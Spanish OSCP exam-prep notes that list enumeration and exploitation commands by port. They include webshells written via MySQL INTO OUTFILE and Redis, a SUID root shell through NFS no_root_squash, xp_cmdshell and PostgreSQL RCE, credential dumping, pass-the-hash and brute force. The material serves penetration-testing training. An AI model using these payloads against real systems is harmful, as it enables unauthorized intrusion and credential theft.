# 02 — Enumeración por servicio

Índice **por puerto**, no por sistema. Encontrás el puerto, venís acá, mirás qué probar.

> Todos los comandos asumen `<IP>` como el objetivo. Reemplazalo.
> Las rutas de wordlists son las de Kali; si no existen, buscá el equivalente en
> `/usr/share/seclists/`.
>
> **Referencia cruzada**: esta sección está alineada con la de
> [oscp.adot8.com — Services](https://oscp.adot8.com/services/inital-scans) (notas de un OSCP real).
> Cada puerto enlaza a su página original.

---

## Índice rápido

| Puerto | Servicio | Salto |
| --- | --- | --- |
| — | Escaneo inicial | [[#Escaneo inicial\|→]] |
| 21 | FTP | [[#21 — FTP\|→]] |
| 22 | SSH | [[#22 — SSH\|→]] |
| 25 / 465 / 587 | SMTP | [[#25 — SMTP\|→]] |
| 53 | DNS | [[#53 — DNS\|→]] |
| 80 / 443 / 8080 / 8443 | HTTP(S) | [[#80 — HTTP(S)\|→]] |
| 80 / 443 | WebDAV | [[#WebDAV (80/443)\|→]] |
| 110 / 995 | POP3 | [[#110 — POP3\|→]] |
| 111 / 2049 | NFS | [[#111 — NFS\|→]] |
| 113 | IDENT | [[#113 — IDENT\|→]] |
| 135 / 139 / 445 | SMB | [[#445 — SMB\|→]] |
| 143 / 993 | IMAP | [[#143 — IMAP\|→]] |
| 161 | SNMP | [[#161 — SNMP\|→]] |
| 389 / 636 | LDAP | [[#389 — LDAP\|→]] |
| 1433 | MSSQL | [[#1433 — MSSQL\|→]] |
| 3306 | MySQL | [[#3306 — MySQL\|→]] |
| 3389 | RDP | [[#3389 — RDP\|→]] |
| 5432 | PostgreSQL | [[#5432 — PostgreSQL\|→]] |
| 5985 / 5986 | WinRM | [[#5985 — WinRM\|→]] |
| 6379 | Redis | [[#6379 — Redis\|→]] |
| 27017 | MongoDB | [[#27017 — MongoDB\|→]] |
| — | Port Knocking | [[#Port Knocking\|→]] |
| — | Web Sockets | [[#Web Sockets\|→]] |
| — | Misc (pwncat, WordPress, KeePass, Git, cewl) | [[#Misc\|→]] |

---

## Escaneo inicial

```bash
# TCP completo, rápido
nmap -p- --min-rate=1000 -Pn -v <IP>
# Servicios/versiones sobre lo abierto
nmap -sC -sV -T5 -Pn -p<puertos> <IP>
# UDP (rápido) y scripts vuln
nmap -sU -T4 -F -v <IP>
nmap -p<puertos> --script=vuln -T5 -Pn <IP>
# Añadir el nombre al /etc/hosts (el nombre de la máquina puede ser un servicio o un usuario)
echo "<IP> <nombre> <dominio>" | sudo tee -a /etc/hosts
```

> Referencia: [adot8 — Initial Scans](https://oscp.adot8.com/services/inital-scans)

---

## 21 — FTP

```bash
# Anónimo
ftp <IP>                      # usuario: anonymous / pass: cualquiera
nmap -sCV -p21 --script "ftp-anon,ftp-syst,ftp-vsftpd-backdoor,ftp-proftpd-backdoor" <IP>

# NetExec
/usr/bin/nxc ftp <IP> -u anonymous -p ''
```

**Qué buscar**

- Login anónimo con contenido escribible → subir una web shell si hay HTTP sirviendo ese path.
- `vsftpd 2.3.4` → backdoor conocido (puerto 6200).
- Banner y versión → `searchsploit vsftpd`.
- **Reutilización de credenciales**: lo que encuentres en FTP suele servir en SSH o SMB.

```bash
searchsploit vsftpd
searchsploit proftpd

# Descargar TODO el contenido anónimo de una vez
wget -r ftp://anonymous:anonymous@<IP>/

# FTPS (FTP sobre TLS)
ftp-ssl -z secure -z verify=0 -p <IP>
```

> Referencia: [adot8 — FTP](https://oscp.adot8.com/services/ftp-less-than-tcp-21-greater-than)

---

## 22 — SSH

```bash
# Banner y algoritmos
nmap -sCV -p22 --script "ssh-auth-methods,ssh-hostkey" <IP>

# Credenciales encontradas en otro lado
ssh user@<IP>
ssh -i id_rsa user@<IP>              # clave privada encontrada
sshpass -p 'password' ssh user@<IP>  # si sshpass no está instalado, ver ../guia/verificado-2026.md
```

**Qué buscar**

- **Credenciales reutilizadas** de FTP, SMB, web, configs. Es el caso más frecuente.
- Clave privada encontrada en un backup, web, o share → probar contra SSH.
- Usuario válido filtrado por LDAP/SMB → enumerar, no fuerza bruta.

> Fuerza bruta SSH es lento y ruidoso. Agotá la reutilización de credenciales antes.
> Si vas a hacerlo, lanzalo en **segundo plano** mientras seguís enumerando:
> `hydra -vV -l <user> -P /usr/share/wordlists/rockyou.txt -I -t 10 ssh://<IP>`

**Claves privadas con passphrase** → `ssh2john` + reglas propias:

```bash
ssh2john id_rsa > ssh.hash
# añadí a /etc/john/john.conf una sección [List.Rules:sshRules] con mutaciones típicas
john --wordlist=./pass.txt --rules=sshRules ssh.hash
```

Nombres de clave a buscar: `id_rsa`, `id_ecdsa`, `id_ed25519`, `id_dsa` (+ variantes `_sk`).

> Referencia: [adot8 — SSH](https://oscp.adot8.com/services/ssh-less-than-tcp-22-greater-than)

---

## 25 — SMTP

```bash
nmap -sCV -p25 --script "smtp-enum-users,smtp-commands,smtp-open-relay" <IP>
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t <IP>
```

**Qué buscar**

- Enumeración de usuarios vía `VRFY` / `EXPN` / `RCPT TO`.
- Open relay.
- Los usuarios válidos alimentan el password spraying contra SMB/LDAP/WinRM.

```bash
telnet <IP> 25
VRFY root
EXPN root
```

> Los usuarios pueden salir de **nombres o de departamentos**. Referencia:
> [adot8 — SMTP](https://oscp.adot8.com/services/smtp-less-than-tcp-25-greater-than)

---

## 53 — DNS

```bash
# Transferencia de zona — probar SIEMPRE
dig axfr @<IP> dominio.local
dnsrecon -d dominio.local -t axfr
fierce --domain dominio.local
```

```bash
# Resolución inversa
dig +noall +answer -x <IP> @<IP>
```

**Qué buscar**

- **AXFR exitoso** → mapa completo del dominio: hosts, subdominios, nombres internos.
- Esto es oro para pivoting: te dice a dónde ir después.

> Referencia: [adot8 — DNS](https://oscp.adot8.com/services/dns-less-than-udp-53-greater-than)

---

## 80 — HTTP(S)

La sección más larga, y donde más tiempo vas a pasar. Ordená el trabajo.

### Paso 1 — Identificar

```bash
whatweb http://<IP>
curl -sI http://<IP>                    # headers, server, redirects
nmap -sCV -p80,443 --script "http-title,http-headers,http-enum,http-robots,http-git" <IP>
```

**Mirá siempre**: `robots.txt`, `sitemap.xml`, comentarios HTML, `.git/`, `/.env`, `/backup`.

### Paso 2 — Tecnología y versión

```bash
# CMS
whatweb -a 3 http://<IP>
wpscan --url http://<IP> --enumerate vp,vt,u     # WordPress
droopescan scan drupal -u http://<IP>            # Drupal
joomscan -u http://<IP>                          # Joomla

# Después: searchsploit con versión EXACTA
searchsploit apache 2.4.49
searchsploit <cms> <version>
```

### Paso 3 — Virtual hosts (no lo saltees)

```bash
ffuf -u http://<IP>/ -H "Host: FUZZ.dominio.local" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
     -mc 200,301,302,401,403 -fs <tamaño_default>

# Agregar al /etc/hosts lo que aparezca
echo "<IP> vhost.dominio.local" | sudo tee -a /etc/hosts
```

Un vhost nuevo puede ser una aplicación completamente distinta, con su propia vulnerabilidad.
Es uno de los hallazgos más comunes y más ignorados.

### Paso 4 — Contenido

```bash
ffuf -u http://<IP>/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
     -mc 200,204,301,302,307,401,403 -t 50

# Extensiones
ffuf -u http://<IP>/indexFUZZ -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt

# Parámetros (para LFI/SQLi/XSS)
ffuf -u "http://<IP>/page.php?FUZZ=test" \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <default>
```

### Vectores que aparecen una y otra vez

| Vector | Cómo se detecta | Siguiente paso |
| --- | --- | --- |
| **LFI** | `?file=`, `?page=`, `?path=`, `?include=` | Leer `/etc/passwd`, logs, `id_rsa`; logs → RCE por envenenamiento |
| **File upload** | Formulario de subida sin validar | Webshell → **y después reverse shell real** |
| **Command injection** | Campos que llegan al SO | `; id`, `\| id`, `$(id)`, `` `id` `` |
| **SQLi** | `'` produce error | `sqlmap` **solo si el examen lo permite** — está en la lista de prohibidos como herramienta automática |
| **SSTI** | `{{7*7}}` → `49` | Jinja2/Twig → RCE |
| **Deserialización** | Cookies, objetos serializados | Gadget chains según lenguaje |

> **Ojo con SQLmap**: figura explícitamente entre las "Automatic exploitation tools"
> prohibidas. Ver `00-reglas-examen.md`. La explotación de SQLi la hacés a mano.

### Si la web corre como servicio

¿El usuario del servicio tiene permisos sobre su propio código? Si podés escribir en la raíz
web, escribís una shell. Ese es un pattern clásico de escalada en Linux.

---

## WebDAV (80/443)

Si `OPTIONS` devuelve `DAV` o `PROPFIND` funciona, es WebDAV (subida de ficheros).

```bash
davtest -sendbd auto -url http://<IP>
davtest -auth user:pass -sendbd auto -url http://<IP>
cadaver http://<IP>
nmap -p80 --script http-webdav-scan <IP>
```

> Referencia: [adot8 — WebDAV](https://oscp.adot8.com/services/webdav)

---

## 110 — POP3

```bash
nmap -sCV -p110,995 --script "pop3-capabilities,pop3-brute" <IP>
```

Credenciales reutilizadas. Correo suele tener información filtrada (usuarios, contraseñas temporales).

```text
telnet <IP> 110
user <usuario>
pass <contraseña>
list
retr <n>
```

> Referencia: [adot8 — POP3](https://oscp.adot8.com/services/pop3-less-than-tcp-110-greater-than)

---

## 111 — NFS

**Vía de escalada clásica y muy común.**

```bash
# Ver qué se exporta
showmount -e <IP>
nmap -sCV -p111,2049 --script "nfs-showmount,nfs-ls,nfs-statfs" <IP>

# Montar
sudo mkdir -p /mnt/nfs
sudo mount -t nfs <IP>:/export/share /mnt/nfs -o nolock
ls -la /mnt/nfs
```

**Qué buscar**

- **`no_root_squash`** → si podés escribir ahí, creás un binario SUID como root local y lo
  ejecutás en la víctima. Escalada directa.

```bash
# En tu Kali, como root, con el share montado y escribible
cat > /mnt/nfs/shell.c <<'EOF'
#include <unistd.h>
int main(void){ setuid(0); setgid(0); system("/bin/bash -p"); }
EOF
gcc /mnt/nfs/shell.c -o /mnt/nfs/shell
sudo chown root:root /mnt/nfs/shell
sudo chmod 4755 /mnt/nfs/shell
# Ahora, EN LA VÍCTIMA:
# /ruta/al/share/shell
```

---

## 113 — IDENT

Servicio antiguo que puede revelar **qué usuario corre un servicio**.

```bash
ident-user-enum <IP> 22 25 80 143
# manual:
nc <IP> 113
<puerto>, <puerto>
```

> Tras sacar un usuario, probá combos `user:user` o fuerza bruta.
> Referencia: [adot8 — IDENT](https://oscp.adot8.com/services/ident-less-than-tcp-113-greater-than)

---

## 445 — SMB

Puerto de máxima prioridad en cualquier examen OSCP.

```bash
# Enumeración básica
nmap -sCV -p139,445 --script "smb-os-discovery,smb-enum-shares,smb-enum-users,smb-security-mode,smb2-security-mode,vuln" <IP>

# NetExec — el caballo de batalla (usar ruta absoluta, ver ../guia/verificado-2026.md)
/usr/bin/nxc smb <IP>
/usr/bin/nxc smb <IP> -u '' -p ''                              # null session
/usr/bin/nxc smb <IP> -u 'guest' -p ''                         # guest
/usr/bin/nxc smb <IP> -u user -p pass --shares
/usr/bin/nxc smb <IP> -u user -p pass --users
/usr/bin/nxc smb <IP> -u user -p pass --pass-pol               # política de contraseñas
/usr/bin/nxc smb <IP> -u user -p pass --rid-brute              # enumerar usuarios por RID
/usr/bin/nxc smb <IP> -u user -p pass --sam                    # dump SAM local
/usr/bin/nxc smb <IP> -u user -p pass --lsa                    # dump LSA local
/usr/bin/nxc smb <IP> -u user -p pass --local-auth

# Si no está instalado nxc, alternativas:
smbclient -L //<IP>/ -N
smbmap -H <IP> -u user -p pass
enum4linux -a <IP>
```

### Nota sobre versiones de SMB

```bash
/usr/bin/nxc smb <IP> -u user -p pass --gen-relay-list relay.txt   # hosts sin firma SMB
```

**Qué buscar**

- **Null session / guest** con shares accesibles.
- Shares con lectura → buscar configs, backups, `web.config`, `unattend.xml`, scripts.
- Shares con **escritura** → subir archivo y esperar a que algo lo ejecute (o DLL hijack).
- `--pass-pol` → saber si el spraying es viable (bloqueo de cuenta).
- `--rid-brute` → lista completa de usuarios, incluso cuando LDAP no responde.

> La **política de bloqueo** decide si podés hacer password spraying. Consultala ANTES de
> disparar. Una cuenta bloqueada en el DC del examen es un problema real.

**Descargar un share entero:**

```bash
smbclient -L "\\\\<IP>\\<share>" -U '' -N          # anónimo
smbclient "\\\\<IP>\\<share>" -U user%password
# dentro:  recurse on ; prompt off ; mget *
```

> Descarga más rápida: añadí `-t 120 --socket-options='TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=131072 SO_SNDBUF=131072'`.
> Referencia: [adot8 — SMB](https://oscp.adot8.com/services/smb-less-than-tcp-445-139-greater-than)

---

## 143 — IMAP

```bash
nmap -sCV -p143,993 --script "imap-capabilities,imap-brute" <IP>
```

Mismo razonamiento que POP3: correo → credenciales y contexto.

```text
telnet <IP> 143
A1 LOGIN <user> <pass>
A1 LIST "" *
A1 SELECT INBOX
A1 FETCH 1 all
A1 FETCH 1 body[text]
```

> Referencia: [adot8 — IMAP](https://oscp.adot8.com/services/imap-less-than-tcp-143-greater-than)

---

## 161 — SNMP

```bash
nmap -sU -p161 --script "snmp-info,snmp-sysdescr" <IP>
snmp-check <IP> -c public -v 2c
snmpwalk -c public -v2c <IP> .
snmpbulkwalk -c public -v2c <IP> .
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt <IP>
```

**Qué buscar** — si SNMP está abierto, **peinalo a fondo**:

- Community string `public`/`private` → procesos, usuarios locales, interfaces, rutas, y a
  veces **credenciales en texto plano**.
- **MIB de comandos extendidos** (¡credenciales!):
  `snmpwalk -c public -v2c <IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull`
- Procesos en ejecución: `snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.4.2.1.2` (y `hrSWRun`/`hrSWInstall`).
- Ordená por unicidad para ver lo raro: `grep -oP '::.*?\.' snmpwalk | sort | uniq -c | sort -n`.

> Referencia: [adot8 — SNMP](https://oscp.adot8.com/services/snmp-less-than-udp-161-greater-than)

---

## 389 — LDAP

```bash
# Anónimo
ldapsearch -x -H ldap://<IP> -s base namingcontexts
ldapsearch -x -H ldap://<IP> -b "DC=dominio,DC=local" -s sub "(objectClass=user)" sAMAccountName

# Con credenciales
ldapsearch -x -H ldap://<IP> -D 'user@dominio.local' -w 'pass' \
           -b "DC=dominio,DC=local" "(objectClass=user)" sAMAccountName description

# NetExec LDAP — atajos potentes
/usr/bin/nxc ldap <IP> -u user -p pass --users
/usr/bin/nxc ldap <IP> -u user -p pass --groups
/usr/bin/nxc ldap <IP> -u user -p pass --pass-pol
/usr/bin/nxc ldap <IP> -u user -p pass --kerberoasting kerberoast.txt
/usr/bin/nxc ldap <IP> -u user -p pass --asreproast asrep.txt
/usr/bin/nxc ldap <IP> -u user -p pass --bloodhound --collection All --dns-server <IP>
```

**Qué buscar**

- `description`, `info`, `comment` con **contraseñas pegadas**. Ocurre más de lo que debería.
- Grupos con nombres sospechosos (`Helpdesk`, `Backup Operators`, `Account Operators`).
- Cuentas sin preautenticación → AS-REP roasting.
- SPNs → Kerberoasting.

Detalle completo en [`05-active-directory.md`](05-active-directory.md).

```bash
# Volcado cómodo del dominio (genera HTML/JSON/grep)
ldapdomaindump ldap://<DC> -u '<DOMINIO>\<USER>' -p '<PASS>'

# Null bind
ldapsearch -H ldap://<IP> -D '' -w '' -b "DC=dominio,DC=local" | grep description

# ¿El DC es una CA? (certificado en 3269)
openssl s_client -showcerts -connect <IP>:3269
```

> Referencia: [adot8 — LDAP](https://oscp.adot8.com/services/ldap-less-than-tcp-389-636-greater-than)

---

## 1433 — MSSQL

```bash
nmap -sCV -p1433 --script "ms-sql-info,ms-sql-empty-password,ms-sql-config,ms-sql-dump-hashes,ms-sql-xp-cmdshell" <IP>

# Credenciales de dominio contra MSSQL
/usr/bin/nxc mssql <IP> -u user -p pass -d dominio.local
/usr/bin/nxc mssql <IP> -u user -p pass -d dominio.local -q "SELECT @@version"

# Shell interactiva (Impacket)
mssqlclient.py dominio.local/user:pass@<IP> -windows-auth
```

### Dentro de MSSQL

```sql
-- Ver permisos
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Habilitar y usar xp_cmdshell (requiere sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

**Qué buscar**

- `sa` con contraseña débil o vacía.
- **Impersonación**: una cuenta sin ser `sysadmin` puede tener permiso `IMPERSONATE` sobre una
  que sí lo es. Muy común y muy subestimado.

```sql
-- Buscar impersonación
SELECT DISTINCT b.name FROM sys.server_permissions a
  INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
  WHERE a.permission_name = 'IMPERSONATE';

EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER;  -- y después xp_cmdshell
```

Con `mssqlclient.py` tenés atajos: `enum_impersonate`, `exec_as_user <grantor>`, `exec_as_login <grantor>`.

**Leer/copiar archivos con SQL:**

```sql
-- leer un archivo
SELECT x FROM OpenRowset(BULK 'C:\Users\Administrator\root.txt', SINGLE_CLOB) R(x);
-- copiar un archivo (via errorfile de bulk insert)
create table #errortable (ignore int);
bulk insert #errortable from '\\localhost\c$\windows\win.ini'
  with ( fieldterminator=',', rowterminator='\n', errorfile='c:\thatjusthappend.txt' );
```

> Referencia: [adot8 — MSSQL](https://oscp.adot8.com/services/mssql-less-than-tcp-1433-greater-than)

- **`EXECUTE AS` encadenado**: impersonar, y desde ahí ver si hay más por impersonar.
- MSSQL corre como un usuario de servicio que suele tener `SeImpersonatePrivilege` → escalada
  por Potato si llegás a ejecución.
- **Out-of-band**: `xp_dirtree`/`xp_fileexist` con una UNC `\\<TU_IP>\share` fuerza una
  autenticación SMB saliente → `Responder` captura el hash NTLMv2 del service account.
- **Trusted Links**: si hay linked servers, se puede ejecutar `xp_cmdshell` en la instancia
  remota (`EXECUTE(...) AT LinkedServer`).

> **Chuleta completa de inyección MSSQL** (union/error/blind/time, stacked queries, OOB,
> UNC path → Responder, Trusted Links, impersonación, hashes): `../cheatsheets/mssql-injection.md`.

---

## 3306 — MySQL

```bash
nmap -sCV -p3306 --script "mysql-info,mysql-empty-password,mysql-enum,mysql-users" <IP>
mysql -u root -h <IP> -p
mysql -u root -h <IP> --password=''     # sin contraseña
# si falla el handshake TLS:  añadí --skip-ssl
```

```sql
-- Enumerar
SELECT user, authentication_string FROM mysql.user;
SHOW DATABASES;
SELECT @@version, @@hostname;

-- A veces hay RCE vía FILE
SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/shell.php';
```

**Qué buscar**

- `root` sin contraseña.
- `FILE` privilege → escribir webshell si hay servidor web.
- Credenciales en tablas de aplicaciones (usuarios, hashes).

---

## 3389 — RDP

```bash
nmap -sCV -p3389 --script "rdp-enum-encryption,rdp-ntlm-info" <IP>

# NetExec
/usr/bin/nxc rdp <IP> -u user -p pass

# Conectar (si está instalado el cliente; ver ../guia/verificado-2026.md)
xfreerdp /v:<IP> /u:user /p:pass /cert:ignore /dynamic-resolution /drive:share,/tmp/share

# Si no hay cliente RDP, hay alternativas sin GUI
/usr/bin/nxc rdp <IP> -u user -p pass      # valida credenciales
```

**Qué buscar**

- Credenciales válidas de otro servicio → probar directo.
- **Session hijacking** en hosts multiusuario: si sos SYSTEM/Administrator, `tscon` te permite
  robar una sesión ajena sin conocer su contraseña.
- `rdp-ntlm-info` filtra nombre de dominio, hostname y a veces versión de Windows.

---

## 5432 — PostgreSQL

```bash
nmap -sCV -p5432 --script "pgsql-brute" <IP>
psql -h <IP> -U postgres
```

```sql
-- Si sos superuser
COPY (SELECT '') TO PROGRAM 'id';        -- RCE directo
```

**Qué buscar**

- `postgres` sin contraseña o con contraseña débil.
- Ejecución de comandos vía `COPY ... TO PROGRAM` si sos superuser.

---

## 5985 — WinRM

Tu entrada preferida a Windows cuando tenés credenciales.

```bash
# Validar
/usr/bin/nxc winrm <IP> -u user -p pass -d dominio.local
/usr/bin/nxc winrm <IP> -u user -p pass -d dominio.local -x whoami

# Shell completa
evil-winrm -i <IP> -u user -p 'pass'
evil-winrm -i <IP> -u user -H <NThash>          # pass-the-hash
evil-winrm -i <IP> -u user -p 'pass' -s /opt/scripts -e /opt/exes

# Cargar PowerView / SharpHound desde dentro
# Upload-Menu / en evil-winrm:  *Evil-WinRM* PS> menu
```

**Qué buscar**

- Usuario en `Remote Management Users` o `Administrators` → acceso directo.
- Pass-the-hash si tenés el hash NTLM.
- Desde dentro: cargar herramientas de enumeración de AD.
- Cualquier miembro de `Administrators` vía WinRM → escalada completa y dump de hashes.

---

## 6379 — Redis

```bash
nmap -sCV -p6379 --script "redis-info" <IP>
redis-cli -h <IP>
```

```text
# Sin autenticación
INFO
CONFIG GET dir
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET x "<?php system($_GET['c']); ?>"
SAVE
```

**Qué buscar**

- Redis sin contraseña → escritura de archivos arbitraria → webshell, o clave SSH autorizada,
  o tarea cron.

```text
# Escribir clave SSH pública
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SET x "\n\n<tu_clave_publica>\n\n"
SAVE
```

---

## 27017 — MongoDB

```bash
nmap -sCV -p27017 --script "mongodb-info,mongodb-databases" <IP>
mongosh <IP>:27017
```

Sin autenticación → dumps de base de datos con credenciales de aplicación adentro.

---

## Port Knocking

El puerto está cerrado hasta que "golpeás" una secuencia. Pista en `/etc/knockd.conf` (o vía
LFI/directory traversal).

```bash
knock <IP> 9842 8475 7469
# alternativa sin `knock`:
for i in 9842 8475 7469; do nmap -Pn --host-timeout 201 --max-retries 0 -p $i <IP>; done
for i in 9842 8475 7469; do nc <IP> $i -v; done
```

> También se puede **sniffear** el tráfico para descubrir la secuencia.
> Referencia: [adot8 — Port Knocking](https://oscp.adot8.com/services/port-knocking)

---

## Web Sockets

```bash
wscat -c ws://<IP>:<puerto>
```

> Para interceptar en Burp, hacelo **al cargar la página**. Referencia:
> [adot8 — Web Sockets](https://oscp.adot8.com/services/web-sockets)

---

## Misc

### pwncat (handler de shells)

```bash
pwncat-cs -m windows -lp 1337
```

### WordPress

```bash
wpscan --url <URL> -e vp        # plugins vulnerables
wpscan --url <URL> -e cb        # backups de config
wpscan --url <URL> -e p --plugins-detection aggressive
wpscan --url <URL> -U users.txt -P /usr/share/wordlists/rockyou.txt
```

- Mirá `wp-content/plugins`. Reverse shell: subir un **plugin** `.php` (en `.zip`) o editar
  Appearance → Editor → `index.php`.

### KeePass

```bash
keepass2john passcodes.kdbx > passcodes.hash
hashcat -m 13400 --user passcodes.hash /usr/share/wordlists/rockyou.txt -O
kpcli      # open passcodes.kdbx
```

### Git

```bash
# si hay un .git expuesto
git-dumper http://<sitio>/.git website
cd website && git log && git show <commit>
```

- Mirá `.htaccess` / `.htpasswd` y **commits antiguos** (credenciales borradas).

### Site scraping (wordlists de usuarios/contraseñas)

```bash
cewl http://<IP>/ > scraped.txt
```

> Referencia: [adot8 — Misc](https://oscp.adot8.com/services/misc)
